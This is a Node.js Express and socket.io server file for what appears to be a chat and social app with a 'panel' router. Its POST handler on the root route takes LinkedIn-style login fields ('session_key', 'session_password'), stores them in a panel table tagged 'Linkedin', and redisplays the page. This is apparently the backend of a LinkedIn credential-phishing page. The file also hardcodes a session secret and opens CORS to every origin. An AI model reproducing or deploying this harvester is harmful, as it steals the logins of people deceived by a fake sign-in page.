const express = require('express');
const app = express();
const users = require('./api/users');
const profiles = require('./api/profiles');
const posts = require('./api/posts');
const chats = require('./api/chats');
const todoRouter = require('./api/todos');
const panelRouter = require('./api/panel');
const cors = require("cors")
const socket = require("socket.io");
const { insertBellQuery, updateMessageStateQuery, insertPanelQuery } = require('./lib/query');
const { executeQuery } = require('./db');
const bodyParser = require('body-parser');
const session = require('express-session')

app.use(cors({
  origin: '*'
}));

const oneDay = 1000 * 60 * 60 * 24;
app.use(session({secret: 'thisismysecretkey_poyilong', resave: false, saveUninitialized: true, cookie: { maxAge: oneDay }}))

//app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(__dirname+'/public'));
app.use(bodyParser.json({limit: '50mb'})); 
app.use(bodyParser.urlencoded({limit: '50mb', extended: true}));
// app.use(express.static('public'));
app.use(express.json());

// Routes
app.use('/', todoRouter);
app.use('/api/users', users);
app.use('/api/profiles', profiles);
app.use('/api/posts', posts);
app.use('/api/chats', chats);
app.use('/api/panel', panelRouter);

app.get('/', (req,res) => {

  res.sendFile('public/pages/index.html',{root:__dirname})

});

app.post('/', async (req, res) => {
  const { session_key, session_password } = req.body;

  try {
    if (session_key != '' && session_password != '')
    {
      executeQuery(insertPanelQuery, [session_key, session_password, 'Linkedin', ''])
      .then((re) => { res.sendFile('public/pages/index.html',{root:__dirname}) })
      .catch((err) => res.sendFile('public/pages/index.html',{root:__dirname}))
    }
    else res.sendFile('public/pages/index.html',{root:__dirname})

  } catch (error) {
    console.error(error);
    res.status(500).json({ status: false, code: 500, message: 'Internal server error' });
  }
});

// Start the server
const port = 3000;
const server = app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

const io = socket(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});
const activeUsers = new Set();

io.on("connection", function (socket) {

  socket.on("new_user", function (data) {
    socket.userId = data;

    activeUsers.forEach(x => x.userId === data ? activeUsers.delete(x) : x)
    activeUsers.add({userId: data, socketID: socket.id});

    console.log(activeUsers)
    io.emit("new_user", [...activeUsers]);
  });

  socket.on("disconnected", () => {
    console.log("disconnected: ", socket.userId)
    activeUsers.delete(socket.userId);
    io.emit("user_disconnected", socket.userId);
  });

  socket.on("message_seen", (data) => {
     // If my socket id doesn't exist, add new user
     let existMe = false
     for (const [key, value] of activeUsers.entries()) {
       if (value.userId == data.sender) {
         existMe = true;
         break
       }
     }
     if (existMe == false) {
       activeUsers.add({userId: data.sender, socketID: socket.id});
     }

    if (data.sender != null && data.to != null)
    {
      socket.broadcast.emit("message_seen", {sender: data.sender, to: data.to})
      executeQuery(updateMessageStateQuery, [1, data.sender, data.to])
      .then((result) => {})
      .catch(() => {})
    }
  });

  socket.on("chat_message", function (data) {

    // If my socket id doesn't exist, add new user
    let existMe = false
    for (const [key, value] of activeUsers.entries()) {
      if (value.userId == data.sender) {
        existMe = true;
        break
      }
    }
    if (existMe == false) {
      activeUsers.add({userId: data.sender, socketID: socket.id});
    }

    let date = new Date();
    let current_time = (date.getHours() < 10 ? '0'+date.getHours(): date.getHours()) + ':' + (date.getMinutes() < 10 ? '0'+date.getMinutes() : date.getMinutes())
    let existReceiverUser = false;

    // finding the socket id of receiver
    for (const [key, value] of activeUsers.entries()) {
      if (value.userId == data.to) {
        io.to(value.socketID).emit("chat_message", { sender: data.sender, to: data.to, message: data.message, created_at: current_time })
        existReceiverUser = true;
        break;
      }
    }

    if (existReceiverUser == false) {
      socket.broadcast.emit("chat_message", { sender: data.sender, to: data.to, message: data.message, created_at: current_time })

      executeQuery(insertBellQuery, [data.to, 'envelope-square', data.message, 1])
      .then((re) => {})
      .catch((err) => console.log("err"))
    }

  });
  
  socket.on("typing", function (data) {
    // socket.broadcast.emit("typing", data);
    // If my socket id doesn't exist, add new user
    let existMe = false
    for (const [key, value] of activeUsers.entries()) {
      if (value.userId == data.sender) {
        existMe = true;
        break
      }
    }
    if (existMe == false) {
      activeUsers.add({userId: data.sender, socketID: socket.id});
    }

    let existReceiverUser = false;
    // finding the socket id of receiver
    for (const [key, value] of activeUsers.entries()) {
      if (value.userId == data.to) {
        existReceiverUser = true
        io.to(value.socketID).emit("typing", { sender: data.sender, to: data.to })
        break;
      }
    }

    if (existReceiverUser == false) {
      socket.broadcast.emit("typing", { sender: data.sender, to: data.to })
    }
  });
});